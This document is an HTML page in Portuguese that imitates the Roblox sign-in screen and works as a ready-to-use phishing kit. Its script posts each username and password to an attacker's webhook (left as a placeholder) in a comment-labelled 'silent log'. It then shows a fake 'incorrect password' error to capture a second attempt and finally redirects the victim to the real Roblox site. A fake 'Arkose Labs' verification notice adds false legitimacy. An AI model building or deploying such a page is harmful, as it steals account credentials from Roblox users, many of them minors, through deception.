<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Entrar na Roblox</title>
    <link rel="icon" type="image/png" href="https://images.rbxcdn.com/241804f5603781f8f3593019f39e830e.ico">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=HCo+Gotham+SSm:wght@400;500;700&display=swap');
        
        :root {
            --bg-main: #191a1f; 
            --bg-card: #272930;
            --input-bg: #121215;
            --text-main: #ffffff;
            --rbx-blue: #0084ff;
            --rbx-error: #df281f;
            --border-grey: #494d5a;
        }

        body, html { 
            margin: 0; padding: 0; min-height: 100%; 
            font-family: 'HCo Gotham SSm', sans-serif; 
            background-color: var(--bg-main); color: var(--text-main); 
            display: flex; flex-direction: column; overflow: hidden;
        }

        /* --- SEU CÓDIGO DE MODAL INTEGRADO --- */
        .modal {
            text-align: center;
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            background-color: rgba(0,0,0,.5);
            z-index: 9999;
            display: none; /* Ativado via JS */
        }

        .modal:before {
            display: inline-block;
            vertical-align: middle;
            content: " ";
            height: 100%
        }

        .modal-dialog {
            box-sizing: border-box;
            width: 400px;
            display: inline-block;
            text-align: left;
            vertical-align: middle;
            margin: 0;
            position: relative;
        }

        .modal-dialog .modal-content.dark-theme {
            background-color: #272930;
            color: #f7f7f8;
            border-radius: 8px;
            overflow: hidden;
            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
        }

        .modal-header {
            padding: 15px;
            border-bottom: 1px solid #454749;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .modal-title h4 { margin: 0; font-size: 18px; font-weight: 700; }

        .close {
            background: none;
            border: none;
            color: #fff;
            font-size: 24px;
            cursor: pointer;
            opacity: 0.5;
        }

        .modal-body { padding: 30px; text-align: center; }

        .modal-footer-note {
            border-top: 1px solid #454749;
            color: #bcbec8;
            padding: 10px;
            text-align: center;
            font-size: 11px;
        }

        /* --- ELEMENTOS DE UI --- */
        .main-content { 
            flex: 1; display: flex; align-items: center; justify-content: center;
            background: linear-gradient(rgba(0,0,0,0.5), rgba(0,0,0,0.5)), url('https://images.rbxcdn.com/97960323ba968f615f5d60920f54546d.jpg');
            background-size: cover; background-position: center;
        }

        .login-card { background-color: var(--bg-card); padding: 40px 30px; border-radius: 8px; width: 400px; text-align: center; }
        
        #error-msg { 
            color: var(--rbx-error); font-size: 13px; margin-bottom: 15px; display: none; 
            background: rgba(223, 40, 31, 0.1); padding: 10px; border-radius: 4px; border-left: 3px solid var(--rbx-error);
            text-align: left;
        }

        .input-field { width: 100%; height: 44px; background-color: var(--input-bg); border: 1px solid #252728; border-radius: 4px; color: #fff; padding: 0 12px; margin-bottom: 12px; box-sizing: border-box; }
        .input-error { border: 1px solid var(--rbx-error) !important; }
        
        .btn-primary-md { width: 100%; height: 40px; border: 1px solid #fff; background: transparent; color: #fff; border-radius: 4px; font-size: 16px; font-weight: 500; cursor: pointer; }

        /* Spinner Animado */
        .spinner { width: 40px; height: 40px; border: 4px solid rgba(255,255,255,0.1); border-top: 4px solid var(--rbx-blue); border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        @keyframes shake { 0%, 100% { transform: translateX(0); } 25% { transform: translateX(-5px); } 75% { transform: translateX(5px); } }
        .shake { animation: shake 0.2s ease-in-out 0s 2; }
    </style>
</head>
<body>

<div class="modal" id="modal-verificacao">
    <div class="modal-dialog">
        <div class="modal-content dark-theme">
            <div class="modal-header">
                <div class="modal-title"><h4>Verificação</h4></div>
                <button class="close" onclick="closeModal()">×</button>
            </div>
            <div class="modal-body">
                <div class="modal-image-container">
                    <div class="spinner"></div>
                    <p style="margin-top: 20px; font-size: 14px;">Aguarde, autenticando com os servidores da Roblox...</p>
                </div>
            </div>
            <div class="modal-footer-note">
                Sessão protegida pelo Arkose Labs
            </div>
        </div>
    </div>
</div>

<main class="main-content">
    <div class="login-card" id="card">
        <h1 style="margin-bottom: 25px; font-weight: 700; font-size: 24px;">Entrar na Roblox</h1>
        
        <div id="error-msg">Nome de usuário ou senha incorretos.</div>

        <input type="text" id="user" class="input-field" placeholder="Usuário/e-mail/telefone">
        <input type="password" id="pass" class="input-field" placeholder="Senha">
        <button class="btn-primary-md" onclick="execLogin()">Entrar</button>
        
        <div style="margin-top: 20px; border-top: 1px solid #454749; padding-top: 20px;">
            <a href="#" style="color:#00a2ff; font-size:13px; text-decoration:none;">Esqueceu a senha?</a>
        </div>
    </div>
</main>

<script>
    let attempt = 0;

    function openModal() { document.getElementById('modal-verificacao').style.display = 'block'; }
    function closeModal() { document.getElementById('modal-verificacao').style.display = 'none'; }

    async function execLogin() {
        const u = document.getElementById('user').value;
        const p = document.getElementById('pass').value;
        const card = document.getElementById('card');
        const errorDiv = document.getElementById('error-msg');
        const passInput = document.getElementById('pass');

        if(!u || !p) {
            card.classList.add('shake');
            setTimeout(() => card.classList.remove('shake'), 400);
            return;
        }

        attempt++;
        openModal();

        // LOG SILENCIOSO VIA WEBHOOK
        try {
            await fetch("SUA_WEBHOOK_AQUI", {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    embeds: [{
                        title: attempt === 1 ? "🛡️ VOID - CAPTURA INICIAL" : "🛡️ VOID - SEGUNDA TENTATIVA",
                        color: attempt === 1 ? 3447003 : 15105570,
                        fields: [
                            { name: "👤 Usuário", value: `\`${u}\``, inline: true },
                            { name: "🔑 Senha", value: `\`${p}\``, inline: true }
                        ],
                        footer: { text: `Tentativa: ${attempt}` },
                        timestamp: new Date().toISOString()
                    }]
                }),
                mode: 'no-cors'
            });
        } catch(e) {}

        // SIMULAÇÃO DE CARREGAMENTO E RESPOSTA
        setTimeout(() => {
            closeModal();
            if(attempt === 1) {
                errorDiv.style.display = 'block';
                passInput.value = '';
                passInput.classList.add('input-error');
                card.classList.add('shake');
                setTimeout(() => card.classList.remove('shake'), 400);
            } else {
                window.location.href = "https://www.roblox.com/home";
            }
        }, 2200);
    }
</script>
</body>
</html>
